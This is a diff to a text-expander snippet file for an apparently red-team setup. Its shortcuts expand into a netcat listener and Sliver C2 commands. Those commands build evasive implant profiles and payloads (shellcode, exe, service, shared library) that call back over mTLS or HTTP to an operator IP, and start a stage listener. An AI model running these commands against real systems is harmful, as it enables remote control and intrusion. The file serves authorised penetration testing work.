@@ -91,11 +91,15 @@ matches:
   - trigger: ":nc"
     replace: nc -nvlp 443
     
-  - trigger: ":sliver64prof"
-    replace: profiles new -e --mtls {{IP}}:443 --format shellcode -o windows shellcode-win
-  
-  - trigger: ":sliver32prof"
-    replace: profiles new -e -a 386 --mtls {{IP}}:443 --format shellcode -o windows shellcode-winx86
+  - trigger: ":sliverprof"
+    replace: |
+      profiles new -e --mtls {{IP}}:443 --format shellcode -o windows shellcode-win
+      profiles new -e -a 386 --mtls {{IP}}:443 --format shellcode -o windows shellcode-winx86
+      profiles new -e --mtls {{IP}}:443 --format exe -o windows exe-win
+      profiles new -e --mtls {{IP}}:443 --format service -o windows service-win
+      profiles new -e --mtls {{IP}}:443 --format shared -o windows shared-win -R
+      profiles new -e --mtls {{IP}}:443 --format exe -o linux  exe-lin
+      profiles new -e --mtls {{IP}}:443 --format shared -o linux shared-lin -R
 
   - trigger: ":sliverstage"
     replace: stage-listener --url http://{{IP}}:8443 --prepend-size --profile shellcode-
@@ -107,10 +111,10 @@ matches:
     replace: generate -e -f exe -m {{IP}}:443
 
   - trigger: ":sliverlinexe"
-    replace: generate  -e --mtls {{IP}}:443 -f exe -o linux 
+    replace: generate -e --mtls {{IP}}:443 -f exe -o linux 
 
   - trigger: ":sliverlindll"
-    replace: generate  -e --mtls {{IP}}:443 -f shared -o linux shellcode-lin -R
+    replace: generate -e --mtls {{IP}}:443 -f shared -o linux -R
   
   - trigger: ":sliverwindllb"
     replace: generate beacon -e -f shared -S 23 -J 13 -R -m {{IP}}:443
